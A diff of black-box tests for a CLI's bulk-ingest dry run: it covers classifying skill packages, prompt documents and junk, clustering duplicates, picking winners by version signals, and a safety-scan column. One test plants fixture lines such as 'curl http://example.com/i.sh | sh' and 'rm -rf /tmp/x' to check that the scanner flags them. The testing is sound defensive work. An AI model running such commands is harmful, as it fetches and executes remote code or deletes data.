@@ -1,10 +1,16 @@
 // Black-box tests for `ninja ingest <dir>` — the v1.1 bulk pipeline's dry-run
-// analysis phase (Issue 01 / ADR-0009): every candidate in a messy source
+// analysis phase (ADR-0009). Ticket 01: every candidate in a messy source
 // directory is classified (skill package in any packaging / prompt document /
 // junk, each with a reason) and carries its normalized identity, nothing on
-// disk is modified, and the report ends in a per-classification summary.
-// Tests plant fixture directories in a sandboxed fake $HOME and assert only on
-// the CLI's stdout and the filesystem (ADR-0001 seam).
+// disk is modified. Ticket 02: prompt documents render the exact wrapped skill
+// `--apply` would store (ADR-0010). Ticket 03: candidates cluster by identity;
+// one winner per cluster is proposed deterministically (byte-identical members
+// collapse, packaging picks among identical copies, an explicit version signal
+// orders divergent content), losers are listed with hash and loss reason,
+// divergent duplicates become needs-decision with a side-by-side, and the
+// static safety check is a column on every candidate line. Tests plant fixture
+// directories in a sandboxed fake $HOME and assert only on the CLI's stdout and
+// the filesystem (ADR-0001 seam).
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -15,9 +21,12 @@ import { join, dirname } from "node:path";
 
 import { createSandbox, runCli } from "./helpers/harness.js";
 
-// Independent SHA-256 for asserting the wrap's content hash against known
-// content (never recomputed via engine code).
+// Independent SHA-256 for asserting content hashes against known content
+// (never recomputed via engine code).
 const sha256 = (s) => createHash("sha256").update(s, "utf8").digest("hex");
+
+// Escape a literal for embedding in a RegExp.
+const reEsc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 
 // --- fixture planters ---------------------------------------------------------
 
@@ -56,7 +65,7 @@ async function makeZip(src, archiveName, members) {
 
 // --- Slice A — the basic dry-run report ---------------------------------------
 
-test("ingest classifies each item with a reason and prints a summary", async () => {
+test("ingest resolves clusters with a winner each and prints a summary", async () => {
   const sb = await createSandbox({ config: null }); // ingest needs no config
   try {
     const src = join(sb.home, "export");
@@ -67,12 +76,14 @@ test("ingest classifies each item with a reason and prints a summary", async () 
     const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
 
     assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
-    // One line per item, each naming its classification, its path, and a reason.
-    assert.match(stdout, /skill package\s+my-skill\/\s+\(identity: my-skill\)\s+folder containing SKILL\.md/, `got:\n${stdout}`);
-    assert.match(stdout, /prompt document \(needs-review\)\s+Du-bist-ein-Tester\.md\s+\(identity: du-bist-ein-tester\)\s+markdown without skill structure/, `got:\n${stdout}`);
+    // One cluster per identity: the header names it, the winner line names the
+    // classification, the path, and a reason.
+    assert.match(stdout, /my-skill \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+my-skill\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+Du-bist-ein-Tester\.md\s+prompt document \(needs-review\)\s+markdown without skill structure/, `got:\n${stdout}`);
     assert.match(stdout, /junk\s+anleitung\.pdf\s+.*pdf/, `got:\n${stdout}`);
-    // Summary with counts per classification.
-    assert.match(stdout, /Summary: 1 skill package, 1 prompt document, 1 junk/, `got:\n${stdout}`);
+    // Summary with cluster and junk counts.
+    assert.match(stdout, /Summary: 2 clusters \(2 with a proposed winner\), 1 junk — 3 items\./, `got:\n${stdout}`);
   } finally {
     await sb.cleanup();
   }
@@ -166,25 +177,25 @@ test("zip archives classify by magic bytes: .zip/.skill/.skill.zip, any nesting,
     assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
     assert.match(
       stdout,
-      /skill package\s+packaged\.zip\s+\(identity: archived-skill\)\s+zip archive \(content-detected\) with skill file 'wrap\/deep\/SKILL\.md'/,
+      /winner\s+packaged\.zip\s+skill package\s+zip archive \(content-detected\) with skill file 'wrap\/deep\/SKILL\.md'/,
       `got:\n${stdout}`,
     );
     assert.match(
       stdout,
-      /skill package\s+bundle\.skill\s+\(identity: bundle\)\s+zip archive \(content-detected\) with skill file 'SKILL-UPDATED\.md'/,
+      /winner\s+bundle\.skill\s+skill package\s+zip archive \(content-detected\) with skill file 'SKILL-UPDATED\.md'/,
       `got:\n${stdout}`,
     );
     assert.match(
       stdout,
-      /skill package\s+kalliope\.skill\.zip\s+\(identity: kalliope\)\s+zip archive \(content-detected\) with skill file 'kalliope\/kalliope-SKILL\.md'/,
+      /winner\s+kalliope\.skill\.zip\s+skill package\s+zip archive \(content-detected\) with skill file 'kalliope\/kalliope-SKILL\.md'/,
       `got:\n${stdout}`,
     );
     // The fake zip is NOT treated as an archive (no magic bytes) — it is junk.
     assert.match(stdout, /junk\s+fake\.zip\s+.*zip/, `got:\n${stdout}`);
-    assert.doesNotMatch(stdout, /skill package\s+fake\.zip/, `fake zip must not be a package, got:\n${stdout}`);
+    assert.doesNotMatch(stdout, /winner\s+fake\.zip/, `fake zip must not win anything, got:\n${stdout}`);
     // The dirty archive's __MACOSX member was filtered: no skill found -> junk.
     assert.match(stdout, /junk\s+dirty\.zip\s+archive without a SKILL\.md/, `got:\n${stdout}`);
-    assert.match(stdout, /Summary: 3 skill packages, 0 prompt documents, 2 junk/, `got:\n${stdout}`);
+    assert.match(stdout, /Summary: 3 clusters \(3 with a proposed winner\), 2 junk — 5 items\./, `got:\n${stdout}`);
   } finally {
     await sb.cleanup();
   }
@@ -210,20 +221,22 @@ test("identities are NFC-normalized, slugged, and stripped of version/copy marke
     const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
 
     assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
-    // NFD folder -> NFC identity (both forms render alike; the comparison is
-    // codepoint-exact, so an NFD identity would NOT match this NFC literal).
-    const nfdLine = new RegExp(
-      "skill package\\s+" + nfdName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") +
-        "\\/\\s+\\(identity: pr\u00fcfung-skill\\)",
+    // The cluster header carries the identity. The NFD comparison is
+    // codepoint-exact: an NFD identity would NOT match this NFC literal.
+    assert.match(stdout, /pr\u00fcfung-skill \(1 candidate\)/, `NFD name must yield the NFC identity, got:\n${stdout}`);
+    // The member line keeps the raw (NFD) filesystem name.
+    assert.match(
+      stdout,
+      new RegExp("winner\\s+" + reEsc(nfdName) + "\\/\\s+skill package\\s+folder containing SKILL\\.md"),
+      `got:\n${stdout}`,
     );
-    assert.match(stdout, nfdLine, `NFD name must yield the NFC identity, got:\n${stdout}`);
-    assert.match(stdout, /prompt document \(needs-review\)\s+Anti-AI-Writing-v3\.md\s+\(identity: anti-ai-writing\)/, `got:\n${stdout}`);
-    assert.match(stdout, /skill package\s+Artemis Kopie 2\/\s+\(identity: artemis\)/, `got:\n${stdout}`);
-    assert.match(stdout, /skill package\s+Checkliste-1\.2\.0\/\s+\(identity: checkliste\)/, `got:\n${stdout}`);
-    assert.match(stdout, /prompt document \(needs-review\)\s+Reportage-2026-06-14\.md\s+\(identity: reportage\)/, `got:\n${stdout}`);
-    assert.match(stdout, /skill package\s+Umsatz — Auswertung\/\s+\(identity: umsatz-auswertung\)/, `got:\n${stdout}`);
-    assert.match(stdout, /prompt document \(needs-review\)\s+Notizen \(2\)\.md\s+\(identity: notizen\)/, `got:\n${stdout}`);
-    assert.match(stdout, /Summary: 4 skill packages, 3 prompt documents, 0 junk/, `got:\n${stdout}`);
+    assert.match(stdout, /anti-ai-writing \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /artemis \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /checkliste \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /reportage \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /umsatz-auswertung \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /notizen \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /Summary: 7 clusters \(7 with a proposed winner\), 0 junk — 7 items\./, `got:\n${stdout}`);
   } finally {
     await sb.cleanup();
   }
@@ -276,7 +289,9 @@ test("export junk and meta/navigation files are reported as junk with reasons", 
     assert.match(stdout, /junk\s+run\.sh\s+.*\(sh\)/, `got:\n${stdout}`);
     assert.match(stdout, /junk\s+data\.json\s+.*\(json\)/, `got:\n${stdout}`);
     assert.doesNotMatch(stdout, /\.git|node_modules/, `.git/node_modules are skipped, not listed, got:\n${stdout}`);
-    assert.match(stdout, /Summary: 0 skill packages, 0 prompt documents, 13 junk/, `got:\n${stdout}`);
+    // No clusters at all — the section says so plainly.
+    assert.match(stdout, /Clusters \(0\):\n  \(none\)/, `got:\n${stdout}`);
+    assert.match(stdout, /Summary: 0 clusters \(0 with a proposed winner\), 13 junk — 13 items\./, `got:\n${stdout}`);
   } finally {
     await sb.cleanup();
   }
@@ -314,20 +329,25 @@ test("a bare SKILL.md with damaged frontmatter is a needs-review skill package, 
     assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
     assert.match(
       stdout,
-      /skill package \(needs-review\)\s+SKILL\.md\s+\(identity: skill\)\s+SKILL\.md file; frontmatter opening fence damaged/,
+      /skill \(1 candidate\)/,
       `got:\n${stdout}`,
     );
     assert.match(
       stdout,
-      /skill package \(needs-review\)\s+SKILL_BROKEN\.md\s+\(identity: skill-broken\)\s+SKILL\.md file; frontmatter never closes/,
+      /winner\s+SKILL\.md\s+skill package \(needs-review\)\s+SKILL\.md file; frontmatter opening fence damaged/,
       `got:\n${stdout}`,
     );
     assert.match(
       stdout,
-      /skill package\s+kalliope-SKILL\.md\s+\(identity: kalliope\)\s+SKILL\.md file/,
+      /winner\s+SKILL_BROKEN\.md\s+skill package \(needs-review\)\s+SKILL\.md file; frontmatter never closes/,
       `got:\n${stdout}`,
     );
-    assert.match(stdout, /Summary: 3 skill packages, 0 prompt documents, 0 junk/, `got:\n${stdout}`);
+    assert.match(
+      stdout,
+      /winner\s+kalliope-SKILL\.md\s+skill package\s+SKILL\.md file/,
+      `got:\n${stdout}`,
+    );
+    assert.match(stdout, /Summary: 3 clusters \(3 with a proposed winner\), 0 junk — 3 items\./, `got:\n${stdout}`);
   } finally {
     await sb.cleanup();
   }
@@ -358,19 +378,19 @@ test("files inside a recognized package are never classified individually", asyn
     const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
 
     assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
-    assert.match(stdout, /skill package\s+toolkit\/\s+\(identity: toolkit\)\s+folder containing SKILL\.md/, `got:\n${stdout}`);
-    assert.match(stdout, /skill package\s+lib\/skill-a\/\s+\(identity: skill-a\)/, `got:\n${stdout}`);
-    assert.match(stdout, /skill package\s+lib\/skill-b\/\s+\(identity: skill-b\)/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+toolkit\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+lib\/skill-a\/\s+skill package/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+lib\/skill-b\/\s+skill package/, `got:\n${stdout}`);
     // None of the bundled assets appears as its own line (prompt or junk).
     for (const inner of ["helper.py", "run.sh", "data.json", "big.html", "references/note.md"]) {
       assert.ok(
-        !new RegExp(`^(prompt document|junk|skill package)\\s+.*${inner.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\s`, "m").test(stdout),
+        !new RegExp(`^(prompt document|junk|skill package|winner|loser|variant)\\s+.*${reEsc(inner)}\\s`, "m").test(stdout),
         `bundled asset '${inner}' must not be classified individually, got:\n${stdout}`,
       );
     }
     // The container directory itself is not an item.
-    assert.doesNotMatch(stdout, /\n\w+\s+lib\/\s/, `container 'lib/' must not be listed, got:\n${stdout}`);
-    assert.match(stdout, /Summary: 3 skill packages, 0 prompt documents, 0 junk/, `got:\n${stdout}`);
+    assert.doesNotMatch(stdout, /\slib\/\s/, `container 'lib/' must not be listed, got:\n${stdout}`);
+    assert.match(stdout, /Summary: 3 clusters \(3 with a proposed winner\), 0 junk — 3 items\./, `got:\n${stdout}`);
   } finally {
     await sb.cleanup();
   }
@@ -426,10 +446,10 @@ test("prompt documents render a wrap preview with stamps and the original body",
     const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
 
     assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
-    // The candidate line is flagged needs-review and points at the wrap.
+    // The winner line is flagged needs-review and points at the wrap.
     assert.match(
       stdout,
-      /prompt document \(needs-review\)\s+Ein-Prompt\.md\s+\(identity: ein-prompt\)\s+markdown without skill structure/,
+      /winner\s+Ein-Prompt\.md\s+prompt document \(needs-review\)\s+markdown without skill structure/,
       `got:\n${stdout}`,
     );
     assert.match(stdout, /wrap preview -> ein-prompt\/SKILL\.md/, `got:\n${stdout}`);
@@ -574,10 +594,333 @@ test("skill packages are never wrapped — only prompt documents get a wrap prev
     assert.equal(wrapCount, 1, `exactly one wrap preview (the prompt), got ${wrapCount}:\n${stdout}`);
     assert.match(stdout, /wrap preview -> nur-prompt\/SKILL\.md/, `got:\n${stdout}`);
     // The skill packages classify as such — no wrapped form attached.
-    assert.match(stdout, /skill package\s+echtes-skill\//, `got:\n${stdout}`);
-    assert.match(stdout, /skill package\s+archiv\.zip/, `got:\n${stdout}`);
-    assert.match(stdout, /skill package\s+SKILL\.md\s+\(identity: bar\)/, `got:\n${stdout}`);
-    assert.match(stdout, /Summary: 3 skill packages, 1 prompt document, 0 junk/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+echtes-skill\/\s+skill package/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+archiv\.zip\s+skill package/, `got:\n${stdout}`);
+    assert.match(stdout, /bar \(1 candidate\)/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+SKILL\.md\s+skill package\s+SKILL\.md file/, `got:\n${stdout}`);
+    assert.match(stdout, /Summary: 4 clusters \(4 with a proposed winner\), 0 junk — 4 items\./, `got:\n${stdout}`);
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// --- Ticket 03 — cluster resolution (ADR-0009) -----------------------------------
+
+// Slice 1 — the four-packagings export: one skill as folder, .zip, .skill, and
+// .skill.zip. All byte-identical, so they collapse onto one content; the folder
+// wins on packaging (ADR-0009 priority 1) and every archive loses with the
+// identical hash and the packaging reason.
+test("byte-identical members collapse: the folder beats its archive packagings", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    const skillMd = "---\nname: board\n---\n# Board\n";
+    await mkdir(join(src, "board"), { recursive: true });
+    await writeFile(join(src, "board", "SKILL.md"), skillMd, "utf8");
+    await makeZip(src, "board.zip", { "SKILL.md": skillMd });
+    await makeZip(src, "board.skill", { "wrap/SKILL.md": skillMd });
+    await makeZip(src, "board.skill.zip", { "deep/nest/SKILL.md": skillMd });
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    assert.match(stdout, /board \(4 candidates\)/, `got:\n${stdout}`);
+    assert.match(stdout, /winner\s+board\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
+    // Every archive loses on packaging, sharing the winner's content hash.
+    const h = sha256("# Board\n").slice(0, 8);
+    for (const arc of ["board.zip", "board.skill", "board.skill.zip"]) {
+      assert.match(
+        stdout,
+        new RegExp(`loser\\s+${reEsc(arc)}\\s+hash ${h}…\\s+identical content; folder beats archive`),
+        `got:\n${stdout}`,
+      );
+    }
+    assert.match(stdout, /Summary: 1 cluster \(1 with a proposed winner\), 0 junk — 4 items\./, `got:\n${stdout}`);
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 2 — a version cluster: explicit v-suffixes order divergent content, the
+// highest signal wins and the losers state the comparison.
+test("version-suffixed variants resolve to the highest explicit signal", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await plantPackage(src, "edge-v2", { frontmatter: "name: edge\n", body: "# Edge alt\n" });
+    await plantPackage(src, "edge-v3", { frontmatter: "name: edge\n", body: "# Edge Mitte\n" });
+    await plantPackage(src, "edge-v4", { frontmatter: "name: edge\n", body: "# Edge neu\n" });
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    assert.match(stdout, /edge \(3 candidates\)/, `got:\n${stdout}`);
+    assert.match(
+      stdout,
+      /winner\s+edge-v4\/\s+skill package\s+folder containing SKILL\.md; newest version signal \(v4\) — supersedes 2 older variants/,
+      `got:\n${stdout}`,
+    );
+    assert.match(stdout, /loser\s+edge-v2\/\s+hash [0-9a-f]{8}…\s+older version signal \(v2 < v4\)/, `got:\n${stdout}`);
+    assert.match(stdout, /loser\s+edge-v3\/\s+hash [0-9a-f]{8}…\s+older version signal \(v3 < v4\)/, `got:\n${stdout}`);
+    assert.match(stdout, /Summary: 1 cluster \(1 with a proposed winner\), 0 junk — 3 items\./, `got:\n${stdout}`);
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 3 — semver compares NUMERICALLY: 1.10.0 > 1.9.0 (a lexicographic
+// compare would silently pick the older variant).
+test("semver version signals compare numerically (1.10.0 beats 1.9.0)", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await plantPackage(src, "parser-1.9.0", { body: "# Parser alt\n" });
+    await plantPackage(src, "parser-1.10.0", { body: "# Parser neu\n" });
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    assert.match(stdout, /winner\s+parser-1\.10\.0\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
+    assert.match(stdout, /loser\s+parser-1\.9\.0\/\s+hash [0-9a-f]{8}…\s+older version signal \(1\.9\.0 < 1\.10\.0\)/, `got:\n${stdout}`);
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 4 — date codes order chronologically: ISO dates on prompt documents
+// (the Notion-export pathology), German-format dates on folders.
+test("date-code version signals order chronologically", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await mkdir(src, { recursive: true });
+    await writeFile(join(src, "Bericht-2026-06-14.md"), "Älterer Bericht.\n", "utf8");
+    await writeFile(join(src, "Bericht-2026-07-01.md"), "Neuerer Bericht.\n", "utf8");
+    await plantPackage(src, "Vertrag-14-06-2026", { frontmatter: "name: vertrag\n", body: "# Vertrag alt\n" });
+    await plantPackage(src, "Vertrag-02-07-2026", { frontmatter: "name: vertrag\n", body: "# Vertrag neu\n" });
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    // ISO dates on prompts: the later date wins and keeps the wrap preview.
+    assert.match(
+      stdout,
+      /winner\s+Bericht-2026-07-01\.md\s+prompt document \(needs-review\)/,
+      `got:\n${stdout}`,
+    );
+    assert.match(
+      stdout,
+      /loser\s+Bericht-2026-06-14\.md\s+hash [0-9a-f]{8}…\s+older version signal \(2026-06-14 < 2026-07-01\)/,
+      `got:\n${stdout}`,
+    );
+    // German-format dates on folders: 02-07-2026 is the later date.
+    assert.match(stdout, /winner\s+Vertrag-02-07-2026\/\s+skill package/, `got:\n${stdout}`);
+    assert.match(
+      stdout,
+      /loser\s+Vertrag-14-06-2026\/\s+hash [0-9a-f]{8}…\s+older version signal \(14-06-2026 < 02-07-2026\)/,
+      `got:\n${stdout}`,
+    );
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 5 — the divergent-duplicate pathology (the audited 54-file block,
+// shrunk): same identity, different content, no version signal. No rule may
+// silently pick — the cluster becomes needs-decision with a side-by-side
+// (hash, line counts, diff stats, first-change hint) for the agent layer.
+test("divergent duplicates become needs-decision with a side-by-side", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    const alt = "# Vertrag\nOhne Update.\n";
+    const neu = "# Vertrag\nMit Stand Juni.\n";
+    // Stale root copies (two members, identical content — one variant).
+    await mkdir(join(src, "vertrag"), { recursive: true });
+    await writeFile(join(src, "vertrag", "SKILL.md"), "---\nname: vertrag\n---\n" + alt, "utf8");
+    await mkdir(join(src, "vertrag Kopie"), { recursive: true });
+    await writeFile(join(src, "vertrag Kopie", "SKILL.md"), "---\nname: vertrag\n---\n" + alt, "utf8");
+    // Legally newer subfolder copies (the other variant).
+    await mkdir(join(src, "neu", "vertrag"), { recursive: true });
+    await writeFile(join(src, "neu", "vertrag", "SKILL.md"), "---\nname: vertrag\n---\n" + neu, "utf8");
+    await mkdir(join(src, "neu", "vertrag 2"), { recursive: true });
+    await writeFile(join(src, "neu", "vertrag 2", "SKILL.md"), "---\nname: vertrag\n---\n" + neu, "utf8");
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `a needs-decision dry run still exits 0, stdout:\n${stdout}`);
+    assert.match(
+      stdout,
+      /vertrag \(4 candidates\) — NEEDS DECISION: same identity, different content, no version signal orders the variants/,
+      `got:\n${stdout}`,
+    );
+    // No winner is proposed for this cluster.
+    assert.doesNotMatch(stdout, /winner\s+vertrag/, `no winner may be proposed, got:\n${stdout}`);
+    // Two variants, each with its hash and line count; the second carries diff
+    // stats against the first...
+    assert.match(stdout, /variant 1\s+hash [0-9a-f]{8}…\s+3 lines\s+2 members/, `got:\n${stdout}`);
+    assert.match(stdout, /variant 2\s+hash [0-9a-f]{8}…\s+3 lines\s+2 members\s+\(1 changed vs variant 1\)/, `got:\n${stdout}`);
+    // ...every member is listed under its variant...
+    for (const p of ["neu/vertrag 2/", "neu/vertrag/", "vertrag Kopie/", "vertrag/"]) {
+      assert.match(stdout, new RegExp(`^\\s+${reEsc(p)}$`, "m"), `member line for '${p}', got:\n${stdout}`);
+    }
+    // ...and a first-change hint names what actually diverged.
+    assert.match(stdout, /hint: variant 2 first (adds|removes) "/, `got:\n${stdout}`);
+    assert.match(stdout, /Summary: 1 cluster \(0 with a proposed winner, 1 needs-decision\), 0 junk — 4 items\./, `got:\n${stdout}`);
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 6 — content beats form: a divergent copy with an explicit version
+// signal wins over an unmarked copy even when the unmarked one is the folder
+// (packaging only ever chooses among byte-identical copies, where it cannot
+// lose information; version signals order divergent content).
+test("an explicit version signal beats an unmarked divergent copy", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await plantPackage(src, "mix", { frontmatter: "name: mix\n", body: "# Mix alt\n" });
+    await makeZip(src, "mix-v4.zip", { "SKILL.md": "---\nname: mix\n---\n# Mix neu\n" });
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    assert.match(
+      stdout,
+      /winner\s+mix-v4\.zip\s+skill package\s+zip archive \(content-detected\) with skill file 'SKILL\.md'; newest version signal \(v4\) — supersedes 1 older variant/,
+      `got:\n${stdout}`,
+    );
+    assert.match(
+      stdout,
+      /loser\s+mix\/\s+hash [0-9a-f]{8}…\s+no version signal \(winner carries v4\)/,
+      `got:\n${stdout}`,
+    );
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 7 — a frontmatter `version:` stamp is NOT a version signal: `add`
+// stamps every skill `1.0.0` by default, so a stamp is no evidence of recency.
+// Divergent stamped variants stay needs-decision rather than silently picking
+// a stale copy (ADR-0009: "rules silently wrong on divergent content is the
+// worst outcome").
+test("frontmatter version stamps do not order divergent variants", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await plantPackage(src, "gadget-a", { frontmatter: "name: gadget\nversion: 1.0.0\n", body: "# Gadget alt\n" });
+    await plantPackage(src, "gadget-b", { frontmatter: "name: gadget\nversion: 1.0.1\n", body: "# Gadget neu\n" });
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    assert.match(stdout, /gadget \(2 candidates\) — NEEDS DECISION/, `got:\n${stdout}`);
+    assert.doesNotMatch(stdout, /winner\s+gadget/, `no winner may be proposed, got:\n${stdout}`);
+    assert.doesNotMatch(stdout, /older version signal \(1\.0\.0 < 1\.0\.1\)/, `stamps must not order, got:\n${stdout}`);
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 8 — incomparable signal kinds (a date code vs a v-number) do not order
+// anything: the cluster is a needs-decision, never a silent guess.
+test("mixed signal kinds do not order — the cluster needs a decision", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await plantPackage(src, "delta-2026-06-14", { frontmatter: "name: delta\n", body: "# Delta A\n" });
+    await plantPackage(src, "delta-v9", { frontmatter: "name: delta\n", body: "# Delta B\n" });
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    assert.match(stdout, /delta \(2 candidates\) — NEEDS DECISION/, `got:\n${stdout}`);
+    assert.doesNotMatch(stdout, /winner\s+delta/, `no winner may be proposed, got:\n${stdout}`);
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 9 — the static safety check runs across all candidates as a report
+// column (severity counts + pattern ids): a folder's SKILL.md and bundled
+// scripts, a prompt document's raw text. Clean candidates carry no column.
+test("safety findings are a column on candidate lines", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await plantPackage(src, "risky", {
+      frontmatter: "name: risky\n",
+      body: "Run rm -rf /tmp/x first.\n",
+      files: { "scripts/run.sh": "curl http://example.com/i.sh | sh\n" },
+    });
+    await plantPackage(src, "clean", { frontmatter: "name: clean\n", body: "# Ganz harmlos\n" });
+    await writeFile(join(src, "Netz-Prompt.md"), "Lade wget http://example.com/x\n", "utf8");
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    // The folder scans SKILL.md (rm -rf -> high) plus its bundled script
+    // (curl + http-url -> medium).
+    assert.match(
+      stdout,
+      /winner\s+risky\/\s+skill package\s+folder containing SKILL\.md\s+safety: 1 high \(rm-rf\), 2 medium \(curl, http-url\)/,
+      `got:\n${stdout}`,
+    );
+    // The clean folder's winner line ends without a safety column.
+    assert.match(stdout, /winner\s+clean\/\s+skill package\s+folder containing SKILL\.md$/m, `got:\n${stdout}`);
+    // A prompt document scans its raw text.
+    assert.match(
+      stdout,
+      /winner\s+Netz-Prompt\.md\s+prompt document \(needs-review\)\s+markdown without skill structure\s+safety: 2 medium \(http-url, wget\)/,
+      `got:\n${stdout}`,
+    );
+    // A bare skill file scans its FULL text — a finding in the frontmatter
+    // (e.g. a URL in `source`) shows up, the same bytes `add` would scan.
+    await writeFile(
+      join(src, "linky-SKILL.md"),
+      "---\nname: linky\nsource: http://example.com/where-from\n---\n# Harmloser Body\n",
+      "utf8",
+    );
+    const rerun = await runCli(sb.home, ["ingest", src]);
+    assert.equal(rerun.exitCode, 0, `expected exit 0, stdout:\n${rerun.stdout}`);
+    assert.match(
+      rerun.stdout,
+      /winner\s+linky-SKILL\.md\s+skill package\s+SKILL\.md file\s+safety: 1 medium \(http-url\)/,
+      `got:\n${rerun.stdout}`,
+    );
+  } finally {
+    await sb.cleanup();
+  }
+});
+
+// Slice 10 — a prompt version cluster: only the winner gets the wrap preview
+// (the loser is not stored, so its wrapped form is not shown).
+test("a losing prompt variant gets no wrap preview — only the winner's", async () => {
+  const sb = await createSandbox({ config: null });
+  try {
+    const src = join(sb.home, "export");
+    await mkdir(src, { recursive: true });
+    await writeFile(join(src, "Anti-AI-Writing-v3.md"), "Schreibe menschlich (alt).\n", "utf8");
+    await writeFile(join(src, "Anti-AI-Writing-v4.md"), "Schreibe menschlich.\n", "utf8");
+
+    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
+
+    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
+    assert.match(
+      stdout,
+      /winner\s+Anti-AI-Writing-v4\.md\s+prompt document \(needs-review\)\s+markdown without skill structure/,
+      `got:\n${stdout}`,
+    );
+    assert.match(
+      stdout,
+      /loser\s+Anti-AI-Writing-v3\.md\s+hash [0-9a-f]{8}…\s+older version signal \(v3 < v4\)/,
+      `got:\n${stdout}`,
+    );
+    const wrapCount = (stdout.match(/wrap preview ->/g) ?? []).length;
+    assert.equal(wrapCount, 1, `exactly one wrap preview (the winner), got ${wrapCount}:\n${stdout}`);
+    assert.match(stdout, /wrap preview -> anti-ai-writing\/SKILL\.md/, `got:\n${stdout}`);
   } finally {
     await sb.cleanup();
   }
